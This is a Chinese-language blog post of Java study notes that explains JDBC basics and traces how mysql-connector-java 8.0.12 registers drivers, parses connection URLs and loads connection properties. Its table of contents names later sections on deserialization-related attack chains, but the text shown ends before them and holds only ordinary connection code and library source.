<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"baicany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="java学习">
<meta property="og:type" content="article">
<meta property="og:title" content="jdbc">
<meta property="og:url" content="https://baicany.github.io/2023/10/25/jdbc/index.html">
<meta property="og:site_name" content="baicany">
<meta property="og:description" content="java学习">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://baicany.github.io/images/s20.png">
<meta property="article:published_time" content="2023-10-24T18:16:01.000Z">
<meta property="article:modified_time" content="2023-10-25T14:47:14.359Z">
<meta property="article:author" content="baicany">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baicany.github.io/images/s20.png">


<link rel="canonical" href="https://baicany.github.io/2023/10/25/jdbc/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"https://baicany.github.io/2023/10/25/jdbc/","path":"2023/10/25/jdbc/","title":"jdbc"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>jdbc | baicany</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baicany</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">welcome my world !</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-JDBC"><span class="nav-number"></span> <span class="nav-text">Java JDBC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number"></span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%B1%BB%E5%92%8C%E6%8E%A5%E2%BC%9D"><span class="nav-number"></span> <span class="nav-text">相关类和接⼝</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5"><span class="nav-number"></span> <span class="nav-text">简单的数据库连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SPI-%E6%9C%BA%E5%88%B6"><span class="nav-number"></span> <span class="nav-text">SPI 机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number"></span> <span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8"><span class="nav-number">1.</span> <span class="nav-text">加载驱动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.</span> <span class="nav-text">获取连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E5%8F%82%E6%95%B0%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">扩展参数带来的安全问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#detectCustomCollations%E9%93%BE"><span class="nav-number"></span> <span class="nav-text">detectCustomCollations链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ServerStatusDiffInterceptor%E9%93%BE"><span class="nav-number"></span> <span class="nav-text">ServerStatusDiffInterceptor链</span></a></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baicany"
      src="/images/head.jpg">
  <p class="site-author-name" itemprop="name">baicany</p>
  <div class="site-description" itemprop="description">web小菜狗一枚</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">35</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  <div class="post-gallery" itemscope itemtype="http://schema.org/ImageGallery">
    
    <div class="post-gallery-image">
      <img src="https://baicany.github.io/images/s20.png" itemprop="contentUrl">
    </div>
    </div>

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://baicany.github.io/2023/10/25/jdbc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/head.jpg">
      <meta itemprop="name" content="baicany">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baicany">
      <meta itemprop="description" content="web小菜狗一枚">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="jdbc | baicany">
      <meta itemprop="description" content="java学习">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          jdbc
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-10-25 02:16:01 / 修改时间：22:47:14" itemprop="dateCreated datePublished" datetime="2023-10-25T02:16:01+08:00">2023-10-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
        </span>
    </span>

  
</div>

            <div class="post-description">java学习</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好久没更新了www,因为一直在打ctf,还有上课</p>
<h1 id="Java-JDBC"><a href="#Java-JDBC" class="headerlink" title="Java JDBC"></a>Java JDBC</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Java Database Connetivity，Java数据库连接，是Java提供对数据库进⾏连接、操作的标准API。</p>
<h2 id="相关类和接⼝"><a href="#相关类和接⼝" class="headerlink" title="相关类和接⼝"></a>相关类和接⼝</h2><ul>
<li><p>java.sql.DriverManager</p>
</li>
<li><p>Java通过java.sql.DriverManager来管理所⽤数据库的驱动注册，提供getConnection⽅法来连接数据库</p>
</li>
<li><p>java.sql.Driver<br>负责实现对数据库的连接，所以数据库驱动包都必须实现这个接⼝才能完成数据库连接操作。</p>
</li>
<li><p>java.sql.Connection<br>通过java.sql.DriverManager.getConnection⽅法成功连接数据库后，会返回⼀个java.sql.Connection数据库连接对象，⼀切对数据库的查询操作都将依赖于这个对象</p>
</li>
</ul>
<h2 id="简单的数据库连接"><a href="#简单的数据库连接" class="headerlink" title="简单的数据库连接"></a>简单的数据库连接</h2><p>我这里是用过小皮自带的mysql启动的mysql服务</p>
<p>JDBC连接数据库的⼀般步骤：</p>
<ol>
<li><p>注册驱动</p>
</li>
<li><p>获取连接</p>
</li>
</ol>
<p><strong>⽰例代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/baicany&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">Class.forName(CLASS_NAME);<span class="comment">// 注册驱动类</span></span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure>

<p>对于URL常量 jdbc:mysql:&#x2F;&#x2F; 表⽰要连接的数据库类型mysql， localhost:3306 为mysql服务地址， baicany 为要连接的数据库名</p>
<p><strong>简单查询</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"></span><br><span class="line">statement.execute(<span class="string">&quot;select * from user&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">set</span> <span class="operator">=</span> statement.getResultSet();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (set.next()) &#123;</span><br><span class="line"></span><br><span class="line">System.out.println(set.getString(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">statement.close();</span><br><span class="line"></span><br><span class="line">connection.close();</span><br></pre></td></tr></table></figure>

<p>1 表⽰插叙的列索引，索引从 1 开始，也可以换成列名</p>
<p>这⾥通过DriverManager.getConnection⽅法连接数据库，返回的是com.mysql.cj.jdbc.ConnectionImpl对象</p>
<p>还提⽰我们说com.mysql.jdbc.Driver驱动过时，使⽤的新的驱动com.mysql.cj.jdbc.Driver</p>
<h2 id="SPI-机制"><a href="#SPI-机制" class="headerlink" title="SPI 机制"></a><strong>SPI</strong> 机制</h2><p>Service Provider Interface，是JDK内置的⼀种服务提供发现机制，可以⽤来启动框架扩展和替换组建。服务提供接⼝，不同⼚商可以针对同⼀个接⼝做出不同的实现。</p>
<p>当服务提供者提供了⼀种接⼝的实现之后，需要在classpath下的 META-INF&#x2F;services&#x2F; ⽬录下创建⼀个以服务接⼝命名的⽂件，⽂件内容就是这个接⼝的具体实现类。</p>
<p>当程序需要这个服务时，就可以通过查找这个jar包的 META-INF&#x2F;services&#x2F; 中的配置⽂件，配置⽂件中有接⼝的具体实现类名，可以根据这个类名进行加载实例化。</p>
<p>在connect的jar包中可以看到</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>环境：mysql-connector-java-8.0.12</p>
<h3 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(CLASS_NAME);</span><br><span class="line">或者是</span><br><span class="line">DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br></pre></td></tr></table></figure>

<p>当使⽤Class.forName获取类的Class对象时，会触发这个类的静态代码块，跟进这个驱动类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.err.println(<span class="string">&quot;Loading class `com.mysql.jdbc.Driver&#x27;. This is deprecated. The new driver class is `com.mysql.cj.jdbc.Driver&#x27;. The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是我们看⻅的驱动类过时信息</p>
<p>还能看⻅这个类还继承了com.mysql.cj.jdbc.Driver类，也就是新的驱动类，⽗类的静态代码块先被执⾏</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var1) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Can&#x27;t register driver!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过DriverManager.registerDriver⽅法来注册驱动，要注册的驱动即是com.mysql.cj.jdbc.Driver对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">registerDriver</span><span class="params">(java.sql.Driver driver,</span></span><br><span class="line"><span class="params">        DriverAction da)</span></span><br><span class="line">    <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Register the driver if it has not already been added to our list */</span></span><br><span class="line">    <span class="keyword">if</span>(driver != <span class="literal">null</span>) &#123;</span><br><span class="line">        registeredDrivers.addIfAbsent(<span class="keyword">new</span> <span class="title class_">DriverInfo</span>(driver, da));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// This is for compatibility with the original DriverManager</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println(<span class="string">&quot;registerDriver: &quot;</span> + driver);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽅法中实例化了⼀个DriverInfo对象⽤来存放驱动类信息。</p>
<p>registeredDrivers是DriverManager对象的⼀个变量，通过addIfAbsent⽅法，将DriverInfo对象信息存放进registeredDrivers变量中</p>
<h3 id="获取连接"><a href="#获取连接" class="headerlink" title="获取连接"></a>获取连接</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure>

<p>跟进getConnection⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String url,</span></span><br><span class="line"><span class="params">    String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    java.util.<span class="type">Properties</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Properties();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">        info.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (password != <span class="literal">null</span>) &#123;</span><br><span class="line">        info.put(<span class="string">&quot;password&quot;</span>, password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (getConnection(url, info, Reflection.getCallerClass()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中Reflection.getCallerClass⽅法是⽤于获取调⽤者的类，即在运⾏时确定正在调⽤该⽅法的类的名称，返回⼀个Class对象</p>
<p>跟进getConnection的重载⽅法</p>
<p>关键部分来啦</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(DriverInfo aDriver : registeredDrivers) &#123;</span><br><span class="line">    <span class="comment">// If the caller does not have permission to load the driver then</span></span><br><span class="line">    <span class="comment">// skip it.</span></span><br><span class="line">    <span class="keyword">if</span>(isDriverAllowed(aDriver.driver, callerCL)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            println(<span class="string">&quot;    trying &quot;</span> + aDriver.driver.getClass().getName());</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> aDriver.driver.connect(url, info);</span><br><span class="line">            <span class="keyword">if</span> (con != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Success!</span></span><br><span class="line">                println(<span class="string">&quot;getConnection returning &quot;</span> + aDriver.driver.getClass().getName());</span><br><span class="line">                <span class="keyword">return</span> (con);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>这⾥遍历registeredDrivers变量的值，⾥⾯存放着我们注册过的驱动，随即通过DriverInfo对象获取对应驱动然后就是通过获取的驱动，调⽤其connet⽅法进⾏连接</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">connect</span><span class="params">(String url, Properties info)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ConnectionUrl.acceptsUrl(url)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ConnectionUrl</span> <span class="variable">conStr</span> <span class="operator">=</span> ConnectionUrl.getConnectionUrlInstance(url, info);</span><br><span class="line">                <span class="keyword">switch</span> (conStr.getType()) &#123;</span><br><span class="line">                    <span class="keyword">case</span> SINGLE_CONNECTION:</span><br><span class="line">                        <span class="keyword">return</span> ConnectionImpl.getInstance(conStr.getMainHost());</span><br><span class="line">                    <span class="keyword">case</span> FAILOVER_CONNECTION:</span><br><span class="line">                    <span class="keyword">case</span> FAILOVER_DNS_SRV_CONNECTION:</span><br><span class="line">                        <span class="keyword">return</span> FailoverConnectionProxy.createProxyInstance(conStr);</span><br><span class="line">                    <span class="keyword">case</span> LOADBALANCE_CONNECTION:</span><br><span class="line">                    <span class="keyword">case</span> LOADBALANCE_DNS_SRV_CONNECTION:</span><br><span class="line">                        <span class="keyword">return</span> LoadBalancedConnectionProxy.createProxyInstance(conStr);</span><br><span class="line">                    <span class="keyword">case</span> REPLICATION_CONNECTION:</span><br><span class="line">                    <span class="keyword">case</span> REPLICATION_DNS_SRV_CONNECTION:</span><br><span class="line">                        <span class="keyword">return</span> ReplicationConnectionProxy.createProxyInstance(conStr);</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>ConnectionUrl.acceptsUrl(url)⽅法判断url是否合法，主要判断是否存在协议</p>
<p>这⾥简要分析ConnectionUrl.getConnectionUrlInstance⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    connectionUrl = (ConnectionUrl)connectionUrlCache.get(connStringCacheKey);</span><br><span class="line">    <span class="keyword">if</span> (connectionUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ConnectionUrlParser</span> <span class="variable">connStrParser</span> <span class="operator">=</span> ConnectionUrlParser.parseConnectionString(connString);</span><br><span class="line">        connectionUrl = ConnectionUrl.Type.getConnectionUrlInstance(connStrParser, info);</span><br><span class="line">        connectionUrlCache.put(connStringCacheKey, connectionUrl);</span><br></pre></td></tr></table></figure>

<p>跟进parseConnectionString跟进到最后</p>
<p>parseConnectionString⽅法⽤于解析传⼊的URL</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseConnectionString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">connString</span> <span class="operator">=</span> <span class="built_in">this</span>.baseConnectionString;</span><br><span class="line">....</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.scheme = decodeSkippingPlusSign(matcher.group(<span class="string">&quot;scheme&quot;</span>));</span><br><span class="line">            <span class="built_in">this</span>.authority = matcher.group(<span class="string">&quot;authority&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.path = matcher.group(<span class="string">&quot;path&quot;</span>) == <span class="literal">null</span> ? <span class="literal">null</span> : decode(matcher.group(<span class="string">&quot;path&quot;</span>)).trim();</span><br><span class="line">            <span class="built_in">this</span>.query = matcher.group(<span class="string">&quot;query&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>传⼊的 jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;student ，解析结果为</p>
<p><img src="https://baicany.github.io/images/image-20231020220425785.png" alt="image-20231020220425785"></p>
<p>这⾥的path还会对解析到的部分进⾏⼀次urldecode</p>
<p>回到NonRegisteringDriver类，会调⽤到com.mysql.cj.jdbc.ConnectionImpl.getInstance⽅法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (conStr.getType()) &#123;</span><br><span class="line">    <span class="keyword">case</span> SINGLE_CONNECTION:</span><br><span class="line">        <span class="keyword">return</span> ConnectionImpl.getInstance(conStr.getMainHost());</span><br></pre></td></tr></table></figure>

<p>conStr.getMainHost⽅法会取到我们的URL信息 </p>
<p>getInstance⽅法返回⼀个新实例化的ConnectionImpl对象，其构造⽅法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.props = hostInfo.exposeAsProperties();</span><br><span class="line"><span class="built_in">this</span>.propertySet = <span class="keyword">new</span> <span class="title class_">JdbcPropertySetImpl</span>();</span><br><span class="line"><span class="built_in">this</span>.propertySet.initializeProperties(<span class="built_in">this</span>.props);</span><br></pre></td></tr></table></figure>

<p>exposeAsProperties⽅法则是将遍历hostinfo信息然后设置成键值对</p>
<p>然后实例化了⼀个JdbcPropertySetImpl对象，其⽗类构造⽅法也被调⽤</p>
<p>遍历PropertyDefinitions.<strong>PROPERTY_NAME_TO_PROPERTY_DEFINITION</strong>的值，依次存放进</p>
<p><strong>PROPERTY_NAME_TO_RUNTIME_PROPERTY</strong></p>
<p>这些值正是数据库所允许提供的扩展参数，也就是前⾯提到的query</p>
